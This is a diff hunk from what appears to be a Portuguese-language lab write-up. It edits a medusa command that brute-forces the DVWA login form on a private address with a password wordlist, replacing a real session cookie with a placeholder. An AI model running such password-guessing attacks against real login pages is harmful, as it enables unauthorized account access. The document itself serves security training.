@@ -154,7 +154,7 @@ medusa -h 192.168.122.226 -u admin -P wordlists/senhas.txt -M web-form \
 -m FORM:"/dvwa/vulnerabilities/brute/index.php" \
 -m FORM-DATA:"get?username=&password=&Login=Login" \
 -m DENY-SIGNAL:"Username and/or password incorrect" \
--m CUSTOM-HEADER:"Cookie: security=low; PHPSESSID=7d7cb67a1449c0dce513df7180e2bce9"
+-m CUSTOM-HEADER:"Cookie: security=low; PHPSESSID=<seu_session_id_aqui>"
 ```
 
 **Resultado:**
